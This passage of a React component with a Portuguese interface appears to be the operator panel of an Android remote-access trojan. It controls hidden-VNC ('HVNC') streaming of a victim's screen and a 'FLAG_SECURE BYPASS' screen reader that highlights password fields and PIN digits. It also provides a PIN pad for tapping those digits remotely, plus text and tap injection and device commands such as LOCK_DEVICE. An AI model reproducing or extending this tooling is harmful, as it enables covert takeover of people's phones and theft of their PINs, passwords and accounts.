          boxShadow: `0 0 20px ${toastCol}22`,
        }}>
          <span style={{ color: toastCol, fontSize: 11, fontWeight: 700 }}>{toast}</span>
        </div>
      )}

      {/* Toolbar */}
      <div className="row-sb mb6">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: .5 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap5 mt3">
            <span style={{ fontSize: 10, color: 'var(--text3)' }}>OCR</span>
            <span style={{ fontSize: 10, color: '#4ade80', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 10, fontWeight: 700,
              color: nodes.filter(n => n.text).length ? '#4ade80' : 'var(--text3)' }}>
              {nodes.filter(n => n.text).length > 0
                ? `${Math.min(99, nodes.filter(n => n.text).length)}%` : '—'}
            </span>
            {srPkg && <span style={{ fontSize: 10, color: 'var(--text3)' }}>{srPkg.split('.').pop()}</span>}
          </div>
        </div>
        <div className="row gap4">
          {MODES.map(m => (
            <button key={m.id}
              onClick={() => { setMode(m.id); if (m.id !== 'HVNC') sendCmd('REQUEST_HIERARCHY'); }}
              className={`btn btn-sm ${mode === m.id ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 8px', fontSize: 11, fontWeight: 700 }}>
              {m.label}
            </button>
          ))}
          <button className="btn btn-ghost btn-sm" style={{ padding: '4px 8px', fontSize: 11 }}
            onClick={handleBack}>←</button>
        </div>
      </div>

      {/* Status bar */}
      <div className="row gap5 mb8" style={{ flexWrap: 'wrap' }}>
        <span style={{
          display: 'flex', alignItems: 'center', gap: 4,
          background: 'rgba(0,0,0,.35)', borderRadius: 12, padding: '3px 8px',
          border: `1px solid ${qual.col}33`,
        }}>
          <span style={{ display: 'flex', gap: 2 }}>
            {[1,2,3,4,5].map(i => (
              <span key={i} style={{
                width: 3, height: 8 + i * 1.5,
                background: i <= qual.bars ? qual.col : '#334155',
                borderRadius: 1, display: 'block',
              }} />
            ))}
          </span>
          <span style={{ fontSize: 10, color: qual.col, fontWeight: 700 }}>{qual.label}</span>
        </span>
        <span className={`pill ${vncOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 10 }}>
          {vncOn ? `${fps} FPS · ${latMs}ms` : 'OFF'}
        </span>
        {vncRes && (
          <span className="pill pill-dim" style={{ fontSize: 10 }}>
            {vncRes.w}×{vncRes.h}
          </span>
        )}
        {lyScreenRes && (
          <span className="pill pill-dim" style={{ fontSize: 10 }}>
            LY {lyScreenRes.w}×{lyScreenRes.h}
          </span>
        )}
        {nodes.length > 0 && (
          <span className="pill pill-gold" style={{ fontSize: 10 }}>
            {nodes.filter(n => n.text).length} nodes
          </span>
        )}
        {liveMode && <span className="pill pill-red" style={{ fontSize: 10 }}>🔴 LIVE</span>}
      </div>

      {/* ══ HVNC CANVAS ══════════════════════════════════════════════════════ */}
      {showVnc && (
        <>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            padding: '5px 10px', borderRadius: '8px 8px 0 0',
            background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>HVNC</span>
            <span style={{ width: 1, height: 12, background: 'rgba(255,255,255,.12)' }} />
            <span style={{ fontSize: 10, color: vncOn ? '#4ade80' : '#475569', fontWeight: 700 }}>
              {vncOn ? `${fps} FPS` : 'PARADO'}
            </span>
            <span style={{ fontSize: 10, color: 'var(--text3)' }}>{latMs}ms</span>
            {vncRes && (
              <span style={{ fontSize: 10, color: 'var(--text3)' }}>{vncRes.w}×{vncRes.h}</span>
            )}
            <span style={{ marginLeft: 'auto', fontSize: 9, color: 'var(--text3)', letterSpacing: .3 }}>
              clique · segurar · arrastar · rolar
            </span>
          </div>

          {/* Canvas wrapper — tabIndex enables keyboard passthrough */}
          <div
            tabIndex={0}
            onKeyDown={onKbDown}
            style={{ outline: 'none', position: 'relative', touchAction: 'none' }}
          >
            {/*
              HVNC canvas — uses ImageBitmapRenderingContext (bitmaprenderer).
              · width/height are set automatically by transferFromImageBitmap
                to match the JPEG frame's native resolution.
              · CSS width:100% scales it to viewport; image-rendering:pixelated
                prevents bilinear blur.
            */}
            <canvas
              ref={canvasRefCb}
              onPointerDown={onPtrDown}
              onPointerMove={onPtrMove}
              onPointerUp={onPtrUp}
              onPointerCancel={onPtrUp}
              onContextMenu={onCtxMenu}
              onWheel={onWheel}
              style={{
                display: 'block', width: '100%', height: 'auto',
                borderRadius: mode === 'DUPLO' ? 0 : '0 0 8px 8px',
                cursor: vncOn ? 'crosshair' : 'default',
                imageRendering: 'pixelated',    // ← crisp pixels, no blur
                touchAction: 'none',
              }}
            />
            {/* Overlay: ripple + drag trail + swipe arrow */}
            <canvas
              ref={overlayRef}
              style={{
                position: 'absolute', inset: 0, width: '100%', height: '100%',
                pointerEvents: 'none',
                borderRadius: '0 0 8px 8px',
              }}
            />
            {!vncOn && (
              <div className="vnc-overlay">
                <div className="spin" />
                <div style={{ fontSize: 12, color: 'var(--text2)', marginTop: 8 }}>
                  Aguardando stream...
                </div>
              </div>
            )}
          </div>

          {vncOn && (
            <div style={{
              fontSize: 10, color: 'var(--text3)', textAlign: 'center',
              padding: '4px 0 2px', letterSpacing: .3,
            }}>
              ↑ Clique no canvas e digite para injetar texto · arrastar lento = DRAG · rápido = SWIPE
            </div>
          )}

          <div className="grid g2 mt6 mb8">
            <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ INICIAR</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ PARAR</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
          </div>

          <div className="card card-sm mb8">
            <div className="row-sb mb4">
              <span className="txt-xs txt-dim">QUALIDADE JPEG</span>
              <span className="txt-xs txt-gold bold">{vncQual}%</span>
            </div>
            <input type="range" min="10" max="100" step="5" value={vncQual}
              style={{ width: '100%', accentColor: '#d4950a' }}
              onChange={e => {
                const q = +e.target.value;
                setVncQual(q);
                sendCmd('SET_SILENT_VNC_QUALITY', { quality: q });
              }} />
          </div>
        </>
      )}

      {/* ══ LY — LAYOUT OVERLAY ══════════════════════════════════════════════ */}
      {showLy && (
        <>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8, padding: '5px 10px',
            borderRadius: '8px 8px 0 0', background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>LY</span>
            <span style={{ width: 1, height: 12, background: 'rgba(255,255,255,.12)' }} />
            {nodes.length > 0 && (<>
              <span style={{ fontSize: 10, color: '#fbbf24', fontWeight: 600 }}>
                {nodes.filter(n=>n.clickable).length} TAP
              </span>
              <span style={{ fontSize: 10, color: '#c084fc' }}>{nodes.filter(n=>n.isKeyboard).length} KBD</span>
              <span style={{ fontSize: 10, color: '#34d399' }}>{nodes.filter(n=>n.scrollable).length} SCROLL</span>
              {nodes.filter(n=>n.password).length > 0 && (
                <span style={{ fontSize: 10, color: '#f87171', fontWeight: 700 }}>
                  🔒 {nodes.filter(n=>n.password).length}
                </span>
              )}
            </>)}
            <div className="row gap4" style={{ marginLeft: 'auto' }}>
              <button onClick={() => setLyZoom(v => v === 1 ? 1.7 : v === 1.7 ? 2.5 : 1)}
                className="btn btn-ghost btn-xs" style={{ fontSize: 10, fontWeight: 700, minWidth: 28 }}>
                {lyZoom}×
              </button>
              <button onClick={() => setShowLabels(v => !v)}
                className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`} style={{ fontSize: 10 }}>Aa</button>
              <button onClick={() => setLiveMode(v => !v)}
                className={`btn btn-xs ${liveMode ? 'btn-red' : 'btn-ghost'}`} style={{ fontSize: 10 }}>
                {liveMode ? '🔴' : '⭕'}
              </button>
              <button onClick={() => sendCmd('REQUEST_HIERARCHY')} className="btn btn-ghost btn-xs" style={{ fontSize: 10 }}>↺</button>
            </div>
          </div>

          <div style={{
            background: 'rgba(6,4,14,.9)', border: '1px solid rgba(255,255,255,.07)',
            borderTop: 'none', borderBottom: 'none', padding: '5px 10px',
          }}>
            <input className="input" style={{ width: '100%', fontSize: 11, padding: '4px 8px' }}
              placeholder="Buscar no canvas por texto ou classe..."
              value={lySearch} onChange={e => setLySearch(e.target.value)} />
          </div>

          <div ref={lyContainerRef} style={{
            overflow: lyZoom > 1 ? 'auto' : 'hidden',
            border: '1px solid rgba(59,130,246,.2)', borderTop: 'none',
            borderRadius: '0 0 8px 8px', background: '#060810',
            minHeight: nodes.length ? undefined : 100,
          }}>
            <div style={{
              transform: `scale(${lyZoom})`, transformOrigin: 'top left',
              width: `${100 / lyZoom}%`, touchAction: 'none', cursor: 'crosshair',
            }}
              onPointerDown={onLyPtrDown} onPointerUp={onLyPtrUp} onPointerCancel={onLyPtrUp}>
              <canvas ref={lyRefCb} style={{ display: 'block', width: '100%' }} />
            </div>
            {!nodes.length && (
              <div style={{ display: 'flex', flexDirection: 'column',
                alignItems: 'center', justifyContent: 'center', padding: 32, minHeight: 100 }}>
                <div style={{ fontSize: 28, marginBottom: 8, opacity: .4 }}>◻</div>
                <div style={{ fontSize: 11, color: 'var(--text3)', textAlign: 'center' }}>
                  Toque ↺ para carregar hierarquia
                </div>
              </div>
            )}
          </div>

          <div className="row gap4 mt6 mb6" style={{ flexWrap: 'wrap' }}>
            {[['TAP','#fbbf24'],['EDIT','#34d399'],['SCROLL','#4ade80'],
              ['KBD','#c084fc'],['PIN','#60a5fa'],['PWD','#f87171'],['OFF','#475569']
            ].map(([lbl, col]) => (
              <span key={lbl} style={{
                fontSize: 9, padding: '2px 7px', borderRadius: 4, fontWeight: 700,
                border: `1px solid ${col}55`, color: col, letterSpacing: .5,
              }}>{lbl}</span>
            ))}
          </div>

          {/* Selected node detail */}
          {lySelected && (
            <div className="card card-sm mb8" style={{ border: `1px solid ${nodeColor(lySelected)}33` }}>
              <div className="row-sb mb6">
                <span style={{ fontSize: 11, fontWeight: 800, color: nodeColor(lySelected) }}>
                  {lySelected.cls.split('.').pop() || lySelected.cls}
                </span>
                <button className="btn btn-ghost btn-xs" onClick={() => setLySelected(null)}>✕</button>
              </div>
              {lySelected.text && (
                <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)', marginBottom: 4 }}>
                  "{lySelected.text}"
                </div>
              )}
              {lySelected.bounds && (
                <div className="txt-xs txt-mono txt-dim mb6">
                  [{lySelected.bounds.left},{lySelected.bounds.top}]→
                  [{lySelected.bounds.right},{lySelected.bounds.bottom}]
                </div>
              )}
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                <button className="btn btn-gold btn-sm" onClick={() => tapNode(lySelected)}>TAP</button>
                {lySelected.longClickable && (
                  <button className="btn btn-ghost btn-sm" onClick={() => {
                    const c = bCenter(lySelected.bounds);
                    if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 });
                  }}>HOLD</button>
                )}
                {lySelected.scrollable && (<>
                  <button className="btn btn-ghost btn-sm" onClick={() => {
                    const c = bCenter(lySelected.bounds);
                    if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y - 200, x2: c.x, y2: c.y + 200, duration: 150 });
                  }}>↓</button>
                  <button className="btn btn-ghost btn-sm" onClick={() => {
                    const c = bCenter(lySelected.bounds);
                    if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y + 200, x2: c.x, y2: c.y - 200, duration: 150 });
                  }}>↑</button>
                </>)}
                {lySelected.editable && (
                  <button className="btn btn-blue btn-sm" onClick={() => tapNode(lySelected)}>EDITAR</button>
                )}
              </div>
            </div>
          )}

          {/* Quick PIN pad */}
          {nodes.filter(n => n.isPinDigit && n.text && n.clickable).length > 0 && (
            <div className="card card-sm mb8" style={{ border: '1px solid #60a5fa33' }}>
              <div className="txt-xs txt-dim mb6" style={{ color: '#60a5fa' }}>⌨ PIN</div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {nodes.filter(n => n.isPinDigit && n.text && n.clickable).map((nd, i) => (
                  <button key={i} className="btn btn-blue btn-sm"
                    style={{ minWidth: 38, fontSize: 15, fontWeight: 800 }}
                    onClick={() => tapNode(nd)}>{nd.text}</button>
                ))}
              </div>
            </div>
          )}
        </>
      )}

      {/* Nav keys */}
      <div className="section-title mt2">Navegação</div>
      <div className="grid g4 mb8">
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE']
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* ══ V2 — FLAG_SECURE BYPASS ══════════════════════════════════════════ */}
      {showV2 && (
        <>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8, padding: '5px 10px',
            borderRadius: '8px 8px 0 0', background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#4ade80', letterSpacing: 1 }}>
              🔓 V2 FLAG_SECURE BYPASS
            </span>
          </div>

          <div className="card card-sm" style={{ borderRadius: '0 0 8px 8px', marginBottom: 8 }}>
            <div className="row gap5 mb8" style={{ flexWrap: 'wrap' }}>
              <button className="btn btn-gold btn-sm"
                onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('Aguardando...', '#fbbf24'); }}>
                🌳 HIERARCHY
              </button>
              <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                onClick={() => setLiveMode(v => !v)}>
                {liveMode ? '⏹ LIVE OFF' : '🔴 LIVE ON'}
              </button>
              <button className="btn btn-ghost btn-sm"
                onClick={() => { setNodes([]); setLines([]); setRawData(''); setLySelected(null); }}>
                🗑 CLEAR
              </button>
            </div>

            <div className="row gap5 mb8">
              {[['ocr','📄 OCR'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, lbl]) => (
                <button key={id} onClick={() => setSrTab(id)}
                  className={`btn btn-sm ${srTab === id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
              ))}
              {srTs && (
                <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
                  {new Date(srTs).toLocaleTimeString()}
                </span>
              )}
            </div>

            {srTab === 'ocr' && (
              <div ref={ocrRef} style={{ maxHeight: 420, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
                {lines.length === 0 && (
                  <div className="no-data" style={{ padding: 36 }}>
                    <div style={{ fontSize: 32, marginBottom: 8 }}>🌳</div>
                    <div style={{ fontSize: 12 }}>Toque HIERARCHY para ler a tela</div>
                  </div>
                )}
                {lines.map((row, ri) => (
                  <div key={ri} style={{
                    display: 'flex', gap: 4, flexWrap: 'wrap', padding: '3px 6px',
                    borderRadius: 5, background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
                  }}>
                    {row.map((nd, ni) => (
                      <button key={ni} onClick={() => tapNode(nd)} style={{
                        background: nd.isPinDigit ? 'rgba(96,165,250,.15)' :
                          nd.password ? 'rgba(248,113,113,.12)' :
                          nd.isKeyboard ? 'rgba(192,132,252,.12)' :
                          nd.clickable ? 'rgba(251,191,36,.12)' : 'rgba(255,255,255,.04)',
                        border: `1px solid ${
                          nd.isPinDigit ? '#60a5fa55' : nd.password ? '#f8717155' :
                          nd.isKeyboard ? '#c084fc55' : nd.clickable ? '#fbbf2455' : '#ffffff11'
                        }`,
                        borderRadius: 5, padding: '3px 8px',
                        color: nd.isPinDigit ? '#60a5fa' : nd.password ? '#f87171' :
                               nd.isKeyboard ? '#c084fc' : nd.clickable ? '#fbbf24' : 'var(--text2)',
                        fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                        cursor: nd.clickable ? 'pointer' : 'default',
                        fontFamily: 'var(--font)', opacity: nd.enabled ? 1 : 0.5,
                      }}>
                        {nd.text}
                        {nd.password && <span style={{ marginLeft: 3, fontSize: 10 }}>🔒</span>}
                        {nd.checked  && <span style={{ marginLeft: 3, color: '#4ade80' }}>✓</span>}
                      </button>
                    ))}
                  </div>
                ))}
              </div>
            )}

            {srTab === 'nodes' && (
              <div>
                <div className="input-row mb6">
                  <input className="input" placeholder="Filtrar..." value={filter}
                    onChange={e => setFilter(e.target.value)} />
                  <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
                    {filteredNodes.length}/{nodes.length}
                  </span>
                </div>
                <div style={{ maxHeight: 440, overflowY: 'auto' }}>
                  {filteredNodes.slice(0, 250).map((nd, i) => (
                    <div key={i} style={{
                      padding: '7px 8px', marginBottom: 3, borderRadius: 6,
                      background: 'rgba(255,255,255,.03)',
                      borderLeft: `3px solid ${nodeColor(nd)}`,
                      paddingLeft: 8 + nd.depth * 5,
                      cursor: nd.clickable ? 'pointer' : 'default',
                      opacity: nd.enabled ? 1 : 0.5,
                    }} onClick={() => nd.clickable && tapNode(nd)}>
                      <div className="row-sb">
                        <div style={{ flex: 1, minWidth: 0 }}>
                          {nd.text && <div style={{ fontWeight: 600, fontSize: 12, color: 'var(--text)', marginBottom: 2 }}>{nd.text}</div>}
                          <div style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'var(--font-mono)',
                            overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {nd.cls.split('.').pop()}
                            {nd.id && <span style={{ marginLeft: 6 }}>#{nd.id.split('/').pop()}</span>}
                          </div>
                        </div>
                        <div style={{ display: 'flex', gap: 3, alignItems: 'center', flexShrink: 0 }}>
                          {nd.clickable    && <span style={{ fontSize: 9, color: '#fbbf24', fontWeight: 700 }}>TAP</span>}
                          {nd.scrollable   && <span style={{ fontSize: 9, color: '#4ade80' }}>SCR</span>}
                          {nd.isPinDigit   && <span style={{ fontSize: 9, color: '#60a5fa', fontWeight: 700 }}>PIN</span>}
                          {nd.isKeyboard   && <span style={{ fontSize: 9, color: '#c084fc' }}>⌨</span>}
                          {nd.password     && <span style={{ fontSize: 9, color: '#f87171' }}>🔒</span>}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {srTab === 'raw' && (
              <div>
                <div className="row-sb mb6">
                  <span className="txt-xs txt-dim">{rawData.length} chars</span>
                  <button className="btn btn-ghost btn-xs"
                    onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
                    📋 COPIAR
                  </button>
                </div>
                <div className="term" style={{ height: 400, overflowY: 'auto', whiteSpace: 'pre', fontSize: 10, lineHeight: 1.5 }}>
                  {rawData || 'Nenhum dado.'}
                </div>
              </div>
            )}
          </div>
        </>
      )}

      {/* Text/coord inject */}
      <div className="section-title mt8">Injetar</div>
      <div className="card card-sm mb10">
        <div className="input-row mb8">
          <input className="input" placeholder="Texto para injetar..." value={typeText}
            onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
        </div>
        <div className="input-row">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 68 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 68 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
        </div>
      </div>

      <div style={{ height: 24 }} />
    </div>
  );
}
